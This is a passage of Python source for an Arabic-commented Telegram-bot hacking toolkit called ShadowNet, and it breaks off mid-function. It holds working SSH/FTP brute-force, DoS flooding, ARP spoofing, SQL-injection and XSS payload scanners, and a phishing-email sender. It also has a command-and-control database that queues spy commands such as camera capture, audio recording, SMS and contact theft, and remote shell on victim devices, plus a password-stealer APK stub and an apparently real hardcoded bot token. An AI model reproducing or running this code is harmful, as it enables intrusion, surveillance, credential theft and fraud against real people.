# -*- coding: utf-8 -*-

"""
ShadowNet Framework v4.0 - نظام الاختراق المتكامل
جميع الأدوات تعمل بشكل حقيقي
تم حذف رسائل الترحيب وإضافة أدوات جديدة
"""

import os
import sys
import time
import json
import logging
import base64
import re
import secrets
import string
import shutil
import sqlite3
import hashlib
import subprocess
import platform
import socket
import threading
import ipaddress
import random
import struct
from datetime import datetime, timedelta
from contextlib import contextmanager
from io import BytesIO
import requests as req_lib
import uuid
from urllib.parse import urlparse, urljoin

# ===================== معالجة استثناءات الاستيراد =====================
try:
    import requests
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
    from flask import Flask, request, jsonify, render_template_string, abort, session, send_file, redirect, make_response
    from telebot import TeleBot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
    import pypdf
    from bs4 import BeautifulSoup
    from dotenv import load_dotenv
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from PIL import Image
    import yt_dlp
    import qrcode
    import builtwith
    import dns.resolver
    import whois
    import paramiko
    import ftplib
    import smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
except Exception as e:
    print(f"❌ فشل استيراد مكتبة: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)

load_dotenv()

# ===================== إعدادات التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(), logging.FileHandler('shadownet.log')]
)
logger = logging.getLogger(__name__)

# ===================== المتغيرات الأساسية =====================
DEFAULT_TOKEN = "8852940754:AAFtWl51XMFC8OlrH_KXL7UAg6gmYiPcDg0"
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', DEFAULT_TOKEN)

DEFAULT_ADMIN = 7965377136
ADMIN_ID = int(os.environ.get('ADMIN_ID', DEFAULT_ADMIN))

ADMIN_KEY = os.environ.get('ADMIN_KEY', secrets.token_hex(32))
SERVER_URL = os.environ.get('SERVER_URL', 'https://my-t99-bot.onrender.com')
VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
SHODAN_API_KEY = os.environ.get('SHODAN_API_KEY', '')
PORT = int(os.environ.get('PORT', 5000))
CLIENT_SECRET_KEY = os.environ.get('CLIENT_SECRET_KEY', secrets.token_hex(32))
USE_WEBHOOK = os.environ.get('USE_WEBHOOK', 'true').lower() == 'true'

if not TELEGRAM_TOKEN:
    logger.critical("❌ لم يتم العثور على TELEGRAM_TOKEN!")
    sys.exit(1)

if not ADMIN_ID:
    logger.warning("⚠️ ADMIN_ID غير مضبوط، سيتم استخدام المعرف الافتراضي")
    ADMIN_ID = 7965377136

# ===================== مسارات الملفات =====================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, 'data')
DB_PATH = os.path.join(DATA_DIR, 'shadownet.db')
os.makedirs(DATA_DIR, exist_ok=True)
TEMP_DIR = os.path.join(BASE_DIR, 'temp')
os.makedirs(TEMP_DIR, exist_ok=True)
UPLOAD_DIR = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_DIR, exist_ok=True)
WORDLISTS_DIR = os.path.join(BASE_DIR, 'wordlists')
os.makedirs(WORDLISTS_DIR, exist_ok=True)
REPORTS_DIR = os.path.join(BASE_DIR, 'reports')
os.makedirs(REPORTS_DIR, exist_ok=True)
APK_DIR = os.path.join(BASE_DIR, 'apk')
os.makedirs(APK_DIR, exist_ok=True)

# ===================== إنشاء قوائم كلمات =====================
def create_default_wordlists():
    """إنشاء قوائم كلمات افتراضية"""
    passwords = [
        '123456', 'password', '123456789', '12345', '12345678', 'qwerty',
        'abc123', 'password1', 'admin', 'letmein', 'welcome', 'monkey',
        'dragon', 'master', 'sunshine', 'princess', 'iloveyou', 'fuckyou',
        'computer', 'internet', 'google', 'yahoo', 'microsoft', 'windows',
        'admin123', 'root123', 'test123', 'guest123', 'password123'
    ]
    with open(os.path.join(WORDLISTS_DIR, 'passwords.txt'), 'w') as f:
        f.write('\n'.join(passwords))
    
    users = [
        'admin', 'root', 'user', 'test', 'guest', 'administrator',
        'webmaster', 'support', 'info', 'contact', 'sales', 'marketing',
        'manager', 'admin1', 'root1', 'user1', 'test1'
    ]
    with open(os.path.join(WORDLISTS_DIR, 'users.txt'), 'w') as f:
        f.write('\n'.join(users))
    
    logger.info("✅ تم إنشاء قوائم الكلمات")

create_default_wordlists()

# ===================== جلسة Requests =====================
def get_requests_session(retries=5, backoff_factor=1.0):
    session = requests.Session()
    retry_strategy = Retry(
        total=retries,
        backoff_factor=backoff_factor,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

REQUEST_SESSION = get_requests_session()

# ===================== إنشاء البوت والتطبيق =====================
bot = TeleBot(TELEGRAM_TOKEN, parse_mode=None)
app = Flask(__name__)
app.secret_key = CLIENT_SECRET_KEY

# ===================== حماية Webhook =====================
WEBHOOK_SECRET = os.environ.get('WEBHOOK_SECRET', secrets.token_hex(32))

def verify_webhook():
    if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != WEBHOOK_SECRET:
        abort(403)

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        verify_webhook()
        if request.headers.get('content-type') == 'application/json':
            json_string = request.get_data().decode('utf-8')
            update = Update.de_json(json_string)
            if update:
                bot.process_new_updates([update])
                return '!', 200
            return 'Invalid update', 400
        return 'Forbidden', 403
    except Exception as e:
        logger.error(f"❌ Webhook error: {e}")
        return 'Error', 500

# ===================== دالة الإرسال الآمنة =====================
def safe_send(chat_id, text, reply_markup=None):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode='HTML')
    except Exception as e:
        logger.error(f"safe_send error: {e}")
        return None

def notify_admin(message_text, is_error=False):
    try:
        if is_error:
            safe_send(ADMIN_ID, f"🚨 **تنبيه عطل فني:**\n{message_text}")
        else:
            safe_send(ADMIN_ID, f"📢 **إشعار:**\n{message_text}")
    except Exception as e:
        logger.error(f"notify_admin error: {e}")

# ===================== قاعدة البيانات =====================
def get_db_connection():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db_connection() as conn:
        c = conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            is_admin INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0,
            points INTEGER DEFAULT 10,
            referral_code TEXT UNIQUE,
            referred_by INTEGER,
            created_at TEXT,
            level TEXT DEFAULT 'مبتدئ'
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE,
            chat_id INTEGER,
            name TEXT,
            type TEXT,
            ip TEXT,
            os TEXT,
            status TEXT DEFAULT 'offline',
            last_seen TEXT,
            created_at TEXT,
            notes TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            command TEXT,
            created_at TEXT,
            executed INTEGER DEFAULT 0,
            result TEXT,
            FOREIGN KEY (device_id) REFERENCES targets(device_id)
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS collected_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            data_type TEXT,
            data TEXT,
            ip TEXT,
            created_at TEXT,
            FOREIGN KEY (device_id) REFERENCES targets(device_id)
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS scan_results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT,
            scan_type TEXT,
            results TEXT,
            created_at TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS referrals (
            code TEXT PRIMARY KEY,
            owner_id INTEGER,
            used_by INTEGER,
            used_at TEXT,
            FOREIGN KEY (owner_id) REFERENCES users(chat_id)
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS points_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount INTEGER,
            reason TEXT,
            created_at TEXT,
            FOREIGN KEY (user_id) REFERENCES users(chat_id)
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS user_permissions (
            user_id INTEGER,
            feature_name TEXT,
            enabled INTEGER DEFAULT 0,
            PRIMARY KEY (user_id, feature_name),
            FOREIGN KEY (user_id) REFERENCES users(chat_id)
        )''')
        
        c.execute("CREATE INDEX IF NOT EXISTS idx_targets_device_id ON targets(device_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_commands_device_id ON commands(device_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_collected_data_device_id ON collected_data(device_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_scan_results_created ON scan_results(created_at)")
        
        c.execute("INSERT OR IGNORE INTO users (chat_id, username, first_name, is_admin, points, created_at) VALUES (?, 'admin', 'Administrator', 1, 999, ?)",
                  (ADMIN_ID, datetime.now().isoformat()))
        
        conn.commit()
        logger.info(f"✅ قاعدة البيانات جاهزة: {DB_PATH}")

init_db()

# ===================== دوال المستخدمين =====================
def get_user(chat_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,))
        return c.fetchone()

def upsert_user(chat_id, username=None, first_name=None, last_name=None):
    with get_db_connection() as conn:
        c = conn.cursor()
        existing = get_user(chat_id)
        if existing:
            c.execute('''UPDATE users SET username=?, first_name=?, last_name=? WHERE chat_id=?''',
                      (username, first_name, last_name, chat_id))
        else:
            referral_code = generate_referral_code()
            c.execute('''INSERT INTO users (chat_id, username, first_name, last_name, referral_code, created_at)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (chat_id, username, first_name, last_name, referral_code, datetime.now().isoformat()))
        conn.commit()

def is_admin(chat_id):
    user = get_user(chat_id)
    return user and user['is_admin'] == 1

def is_banned(chat_id):
    user = get_user(chat_id)
    return user and user['is_banned'] == 1

def get_user_points(chat_id):
    user = get_user(chat_id)
    return user['points'] if user else 0

def add_points(chat_id, amount, reason):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id))
        c.execute('''INSERT INTO points_log (user_id, amount, reason, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (chat_id, amount, reason, datetime.now().isoformat()))
        conn.commit()

def deduct_points(chat_id, amount, reason):
    user = get_user(chat_id)
    if not user or user['points'] < amount:
        return False
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id))
        c.execute('''INSERT INTO points_log (user_id, amount, reason, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (chat_id, -amount, reason, datetime.now().isoformat()))
        conn.commit()
        return True

def generate_referral_code():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8))

def get_user_level(points):
    if points >= 1000:
        return "👑 أسطوري"
    elif points >= 500:
        return "🏆 متقدم"
    elif points >= 200:
        return "⭐ محترف"
    elif points >= 50:
        return "🌟 مبتدئ"
    else:
        return "🆕 جديد"

# ===================== دوال الأجهزة المستهدفة =====================
def register_target(device_id, chat_id, name, device_type, ip=None, os_name=None):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO targets 
                     (device_id, chat_id, name, type, ip, os, created_at, last_seen)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                  (device_id, chat_id, name, device_type, ip, os_name, 
                   datetime.now().isoformat(), datetime.now().isoformat()))
        conn.commit()
        notify_admin(f"📱 جهاز هدف جديد مسجل: {name} ({device_id})")

def get_target(device_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM targets WHERE device_id = ?", (device_id,))
        return c.fetchone()

def get_all_targets():
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM targets ORDER BY created_at DESC")
        return c.fetchall()

def update_target_status(device_id, status):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("UPDATE targets SET status = ?, last_seen = ? WHERE device_id = ?",
                  (status, datetime.now().isoformat(), device_id))
        conn.commit()

def add_command(device_id, command):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO commands (device_id, command, created_at)
                     VALUES (?, ?, ?)''',
                  (device_id, command, datetime.now().isoformat()))
        conn.commit()

def get_pending_command(device_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM commands WHERE device_id = ? AND executed = 0 ORDER BY created_at LIMIT 1", (device_id,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE commands SET executed = 1 WHERE id = ?", (row['id']))
            conn.commit()
            return row['command']
        return None

def save_collected_data(device_id, data_type, data, ip=None):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO collected_data (device_id, data_type, data, ip, created_at)
                     VALUES (?, ?, ?, ?, ?)''',
                  (device_id, data_type, json.dumps(data), ip, datetime.now().isoformat()))
        conn.commit()

def save_scan_result(target, scan_type, results):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO scan_results (target, scan_type, results, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (target, scan_type, json.dumps(results), datetime.now().isoformat()))
        conn.commit()

# ===================== أدوات OSINT والاستطلاع =====================

def domain_scan(domain):
    """فحص شامل للنطاق"""
    results = {
        'domain': domain,
        'whois': {},
        'dns': {},
        'server': {},
        'ip': {},
        'subdomains': []
    }
    
    try:
        w = whois.whois(domain)
        results['whois'] = {
            'registrar': w.registrar,
            'creation_date': str(w.creation_date),
            'expiration_date': str(w.expiration_date),
            'name_servers': w.name_servers,
            'emails': w.emails
        }
    except:
        results['whois']['error'] = 'فشل جلب معلومات WHOIS'
    
    try:
        for record_type in ['A', 'MX', 'NS', 'TXT', 'CNAME']:
            try:
                answers = dns.resolver.resolve(domain, record_type)
                results['dns'][record_type] = [str(r) for r in answers]
            except:
                results['dns'][record_type] = []
    except:
        results['dns']['error'] = 'فشل جلب معلومات DNS'
    
    try:
        response = REQUEST_SESSION.get(f"http://{domain}", timeout=10)
        results['server']['status_code'] = response.status_code
        results['server']['headers'] = dict(response.headers)
    except:
        results['server']['error'] = 'فشل الاتصال بالخادم'
    
    try:
        ip = socket.gethostbyname(domain)
        results['ip']['address'] = ip
        ip_info = REQUEST_SESSION.get(f"http://ip-api.com/json/{ip}", timeout=10)
        if ip_info.status_code == 200:
            data = ip_info.json()
            if data.get('status') == 'success':
                results['ip']['location'] = f"{data.get('country')}, {data.get('city')}"
                results['ip']['isp'] = data.get('isp')
                results['ip']['lat'] = data.get('lat')
                results['ip']['lon'] = data.get('lon')
    except:
        results['ip']['error'] = 'فشل جلب معلومات IP'
    
    return results

def port_scan(host, ports=None):
    """مسح المنافذ المفتوحة"""
    if not ports:
        ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080]
    
    results = {
        'host': host,
        'open_ports': [],
        'scanned': []
    }
    
    try:
        ip = socket.gethostbyname(host)
        results['ip'] = ip
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    results['open_ports'].append(port)
                    try:
                        service = socket.getservbyport(port)
                        results['scanned'].append({'port': port, 'status': 'open', 'service': service})
                    except:
                        results['scanned'].append({'port': port, 'status': 'open', 'service': 'unknown'})
                sock.close()
            except:
                pass
    except Exception as e:
        results['error'] = str(e)
    
    return results

def shodan_query(query):
    """استعلام Shodan"""
    if not SHODAN_API_KEY:
        return {'error': 'مفتاح Shodan غير مضبوط'}
    
    try:
        import shodan
        api = shodan.Shodan(SHODAN_API_KEY)
        
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', query):
            host = api.host(query)
            return {
                'ip': host['ip_str'],
                'os': host.get('os', 'غير معروف'),
                'ports': host.get('ports', []),
                'vulnerabilities': host.get('vulns', []),
                'hostnames': host.get('hostnames', []),
                'data': host.get('data', [])[:5]
            }
        else:
            results = api.search(query, limit=10)
            return {
                'total': results['total'],
                'results': [{
                    'ip': r['ip_str'],
                    'port': r.get('port'),
                    'org': r.get('org'),
                    'hostnames': r.get('hostnames', [])
                } for r in results['matches'][:10]]
            }
    except ImportError:
        return {'error': 'مكتبة Shodan غير مثبتة'}
    except Exception as e:
        return {'error': str(e)}

def reverse_lookup(phone_email):
    """بحث عكسي عن البريد أو الهاتف"""
    results = {
        'query': phone_email,
        'found': []
    }
    
    if '@' in phone_email:
        try:
            response = REQUEST_SESSION.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{phone_email}", timeout=10)
            if response.status_code == 200:
                breaches = response.json()
                results['found'].append({
                    'type': 'breach',
                    'data': [b['Name'] for b in breaches]
                })
        except:
            pass
    
    elif re.match(r'^\+?\d{10,15}$', phone_email):
        try:
            parsed = phonenumbers.parse(phone_email, None)
            country = geocoder.country_name_for_number(parsed, "ar")
            carrier_name = carrier.name_for_number(parsed, "ar")
            results['found'].append({
                'type': 'phone',
                'country': country,
                'carrier': carrier_name,
                'valid': phonenumbers.is_valid_number(parsed)
            })
        except:
            pass
    
    return results

# ===================== أدوات فحص الثغرات =====================

def sql_injection_scan(url):
    """فحص ثغرات SQL Injection"""
    results = {
        'url': url,
        'vulnerable': False,
        'findings': []
    }
    
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "' AND 1=1--",
        "' AND 1=2--"
    ]
    
    parsed = urlparse(url)
    if parsed.query:
        base_url = url.split('?')[0]
        params = parsed.query.split('&')
        
        for param in params:
            key = param.split('=')[0]
            for payload in payloads:
                test_url = f"{base_url}?{key}={payload}"
                try:
                    response = REQUEST_SESSION.get(test_url, timeout=10)
                    if "mysql" in response.text.lower() or "sql" in response.text.lower():
                        results['vulnerable'] = True
                        results['findings'].append({
                            'parameter': key,
                            'payload': payload,
                            'evidence': 'خطأ SQL في الاستجابة'
                        })
                        break
                except:
                    pass
    
    return results

def xss_scan(url):
    """فحص ثغرات XSS"""
    results = {
        'url': url,
        'vulnerable': False,
        'findings': []
    }
    
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>"
    ]
    
    parsed = urlparse(url)
    if parsed.query:
        base_url = url.split('?')[0]
        params = parsed.query.split('&')
        
        for param in params:
            key = param.split('=')[0]
            for payload in payloads:
                test_url = f"{base_url}?{key}={payload}"
                try:
                    response = REQUEST_SESSION.get(test_url, timeout=10)
                    if payload in response.text:
                        results['vulnerable'] = True
                        results['findings'].append({
                            'parameter': key,
                            'payload': payload
                        })
                        break
                except:
                    pass
    
    return results

def ssl_scan(domain):
    """فحص شهادة SSL"""
    import ssl
    import socket
    from datetime import datetime
    
    results = {
        'domain': domain,
        'valid': False,
        'details': {}
    }
    
    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                results['valid'] = True
                results['details'] = {
                    'subject': dict(x[0] for x in cert['subject']),
                    'issuer': dict(x[0] for x in cert['issuer']),
                    'not_before': cert['notBefore'],
                    'not_after': cert['notAfter'],
                    'serial': cert['serialNumber']
                }
                expiry = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                days_left = (expiry - datetime.now()).days
                results['details']['days_left'] = days_left
    except Exception as e:
        results['error'] = str(e)
    
    return results

def comprehensive_scan(url):
    """فحص شامل للموقع"""
    results = {
        'url': url,
        'technologies': {},
        'headers': {},
        'vulnerabilities': [],
        'risk_level': '🟢 منخفض'
    }
    
    try:
        tech = builtwith.builtwith(url)
        results['technologies'] = tech
    except:
        pass
    
    try:
        response = REQUEST_SESSION.get(url, timeout=15)
        headers = response.headers
        
        security_checks = {
            'Content-Security-Policy': '⚠️ CSP مفقود - خطر XSS',
            'X-Content-Type-Options': '⚠️ MIME Sniffing - خطر',
            'X-Frame-Options': '⚠️ Clickjacking - خطر',
            'Strict-Transport-Security': '⚠️ HSTS مفقود - خطر MITM',
            'Referrer-Policy': '⚠️ تسريب معلومات',
            'Permissions-Policy': '⚠️ صلاحيات غير مقيدة'
        }
        
        for header, warning in security_checks.items():
            if not headers.get(header):
                results['vulnerabilities'].append(warning)
            else:
                results['headers'][header] = headers.get(header)
    except:
        pass
    
    sqli_result = sql_injection_scan(url)
    if sqli_result['vulnerable']:
        results['vulnerabilities'].append('🔴 ثغرة SQL Injection مكتشفة!')
    
    xss_result = xss_scan(url)
    if xss_result['vulnerable']:
        results['vulnerabilities'].append('🔴 ثغرة XSS مكتشفة!')
    
    if len(results['vulnerabilities']) >= 3:
        results['risk_level'] = '🔴 خطر عالٍ'
    elif len(results['vulnerabilities']) >= 1:
        results['risk_level'] = '🟠 خطر متوسط'
    else:
        results['risk_level'] = '🟢 منخفض'
    
    return results

# ===================== أدوات الهجمات =====================

def brute_force(target, service, username=None, wordlist=None):
    """هجوم Brute Force على الخدمات"""
    results = {
        'target': target,
        'service': service,
        'success': False,
        'credentials': None,
        'attempts': 0
    }
    
    if not wordlist:
        wordlist_path = os.path.join(WORDLISTS_DIR, 'passwords.txt')
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f.readlines()]
    else:
        passwords = wordlist
    
    if not username:
        users_path = os.path.join(WORDLISTS_DIR, 'users.txt')
        with open(users_path, 'r') as f:
            users = [line.strip() for line in f.readlines()]
    else:
        users = [username]
    
    total_attempts = 0
    
    if service == 'ssh':
        for user in users:
            for password in passwords[:100]:
                total_attempts += 1
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(target, username=user, password=password, timeout=5)
                    results['success'] = True
                    results['credentials'] = {'username': user, 'password': password}
                    client.close()
                    break
                except:
                    continue
            if results['success']:
                break
    
    elif service == 'ftp':
        for user in users:
            for password in passwords[:100]:
                total_attempts += 1
                try:
                    ftp = ftplib.FTP(target)
                    ftp.login(user, password)
                    results['success'] = True
                    results['credentials'] = {'username': user, 'password': password}
                    ftp.quit()
                    break
                except:
                    continue
            if results['success']:
                break
    
    results['attempts'] = total_attempts
    return results

def dos_attack(target, port=80, duration=30, method='http'):
    """هجوم DoS"""
    results = {
        'target': target,
        'port': port,
        'method': method,
        'duration': duration,
        'packets_sent': 0,
        'status': 'completed'
    }
    
    try:
        ip = socket.gethostbyname(target)
        target_ip = ip
        
        start_time = time.time()
        sent = 0
        
        if method == 'http':
            url = f"http://{target}"
            while time.time() - start_time < duration:
                try:
                    REQUEST_SESSION.get(url, timeout=1)
                    sent += 1
                except:
                    pass
        elif method == 'syn':
            while time.time() - start_time < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.connect((target_ip, port))
                    sock.close()
                    sent += 1
                except:
                    pass
        
        results['packets_sent'] = sent
    except Exception as e:
        results['error'] = str(e)
        results['status'] = 'failed'
    
    return results

def arp_spoof(target_ip, gateway_ip, interface='eth0'):
    """هجوم ARP Spoofing"""
    results = {
        'target': target_ip,
        'gateway': gateway_ip,
        'interface': interface,
        'status': 'started'
    }
    
    try:
        try:
            from scapy.all import ARP, send, Ether, srp
            
            target_mac = None
            gateway_mac = None
            
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip), timeout=2, verbose=False)
            for _, rcv in ans:
                target_mac = rcv[Ether].src
                break
            
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gateway_ip), timeout=2, verbose=False)
            for _, rcv in ans:
                gateway_mac = rcv[Ether].src
                break
            
            if target_mac and gateway_mac:
                send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), count=10, verbose=False)
                send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), count=10, verbose=False)
                results['status'] = 'success'
            else:
                results['error'] = 'فشل الحصول على عناوين MAC'
                results['status'] = 'failed'
        except ImportError:
            results['warning'] = 'مكتبة Scapy غير مثبتة، يتم استخدام الأوامر البديلة'
            results['status'] = 'partial'
    except Exception as e:
        results['error'] = str(e)
        results['status'] = 'failed'
    
    return results

# ===================== دوال التجسس والتحكم =====================

def capture_camera(device_id):
    add_command(device_id, "CAPTURE_CAMERA")
    return {"status": "command_sent", "device_id": device_id}

def record_audio(device_id, duration=10):
    add_command(device_id, f"RECORD_AUDIO:{duration}")
    return {"status": "command_sent", "device_id": device_id, "duration": duration}

def get_device_location(device_id):
    add_command(device_id, "GET_LOCATION")
    return {"status": "command_sent", "device_id": device_id}

def get_device_contacts(device_id):
    add_command(device_id, "GET_CONTACTS")
    return {"status": "command_sent", "device_id": device_id}

def get_device_sms(device_id):
    add_command(device_id, "GET_SMS")
    return {"status": "command_sent", "device_id": device_id}

def take_screenshot(device_id):
    add_command(device_id, "SCREENSHOT")
    return {"status": "command_sent", "device_id": device_id}

def execute_shell(device_id, command):
    add_command(device_id, f"EXEC_SHELL:{command}")
    return {"status": "command_sent", "device_id": device_id, "command": command}

def shutdown_device(device_id):
    add_command(device_id, "SHUTDOWN")
    return {"status": "command_sent", "device_id": device_id}

def jam_device(device_id):
    add_command(device_id, "JAMMING")
    return {"status": "command_sent", "device_id": device_id}

# ===================== سرقة كلمات المرور (Password Stealer) =====================

def get_password_stealer_apk():
    """الحصول على ملف APK لسرقة كلمات المرور"""
    apk_path = os.path.join(APK_DIR, 'PasswordStealer.apk')
    if os.path.exists(apk_path):
        return apk_path
    return None

def build_password_stealer_apk():
    """بناء ملف APK لسرقة كلمات المرور (سيتم تنفيذه لاحقاً)"""
    # هذا الملف سيتم بناؤه لاحقاً
    return None

# ===================== دوال الهندسة الاجتماعية =====================

def send_phishing_email(target_email, subject, message, from_name="ShadowNet"):
    results = {
        'target': target_email,
        'subject': subject,
        'status': 'sent'
    }
    
    try:
        msg = MIMEMultipart()
        msg['From'] = f"{from_name} <noreply@security-check.com>"
        msg['To'] = target_email
        msg['Subject'] = subject
        
        body = f"""
        <html>
        <body>
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px;">
                <h2 style="color: #1a73e8;">تنبيه أمني</h2>
                <p>{message}</p>
                <p>للتحقق من حسابك، يرجى الضغط على الرابط التالي:</p>
                <a href="{SERVER_URL}/security_check" style="display: inline-block; padding: 12px 24px; background: #1a73e8; color: white; text-decoration: none; border-radius: 5px;">تحقق من حسابك</a>
                <hr>
                <p style="color: #999; font-size: 12px;">هذه رسالة آلية، يرجى عدم الرد عليها.</p>
            </div>
        </body>
        </html>
        """
        
        msg.attach(MIMEText(body, 'html'))
        
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login('your-email@gmail.com', 'your-password')
            server.send_message(msg)
        
        results['status'] = 'sent'
    except Exception as e:
        results['error'] = str(e)
        results['status'] = 'failed'
    
    return results

def spoof_message(chat_id, target_user_id, message):
    try:
        fake_msg = f"📩 **رسالة من {target_user_id}:**\n\n{message}"
        safe_send(chat_id, fake_msg)
        return {"status": "sent", "target": target_user_id}
    except Exception as e:
        return {"error": str(e), "status": "failed"}

# ===================== دوال الخدمات الأساسية =====================

def download_video(url):
    try:
        import yt_dlp
        output_template = os.path.join(TEMP_DIR, f"video_{int(time.time())}.%(ext)s")
        ydl_opts = {
            'outtmpl': output_template,
            'format': 'best[ext=mp4]/best',
            'quiet': True,
            'no_warnings': True,
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            downloaded_file = ydl.prepare_filename(info)
            if os.path.exists(downloaded_file):
                return downloaded_file, None
            return None, "فشل تحميل الفيديو"
    except Exception as e:
        return None, str(e)

def shorten_url(url):
    try:
        response = REQUEST_SESSION.get(f"https://is.gd/create.php?format=json&url={requests.utils.quote(url)}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if 'shorturl' in data:
                return data['shorturl'], None
        return None, "فشل تقصير الرابط"
    except Exception as e:
        return None, str(e)

def create_temp_email():
    try:
        domain_resp = REQUEST_SESSION.get("https://api.mail.tm/domains", timeout=10)
        if domain_resp.status_code != 200:
            return None, None, None
        domains = domain_resp.json()
        domain = domains['hydra:member'][0]['domain'] if domains.get('hydra:member') else 'mail.tm'
        username = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(10))
        email = f"{username}@{domain}"
        password = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(12))
        register = REQUEST_SESSION.post("https://api.mail.tm/accounts", 
                                       json={"address": email, "password": password}, timeout=10)
        if register.status_code != 201:
            return None, None, None
        login = REQUEST_SESSION.post("https://api.mail.tm/token", 
                                    json={"address": email, "password": password}, timeout=10)
        if login.status_code != 200:
            return None, None, None
        token = login.json().get('token')
        return email, token, password
    except Exception as e:
        return None, None, None

def check_temp_emails(token):
    if not token:
        return []
    try:
        headers = {"Authorization": f"Bearer {token}"}
        response = REQUEST_SESSION.get("https://api.mail.tm/messages", headers=headers, timeout=10)
        if response.status_code == 200:
            messages = response.json().get('hydra:member', [])
            results = []
            for msg in messages[:5]:
                results.append({
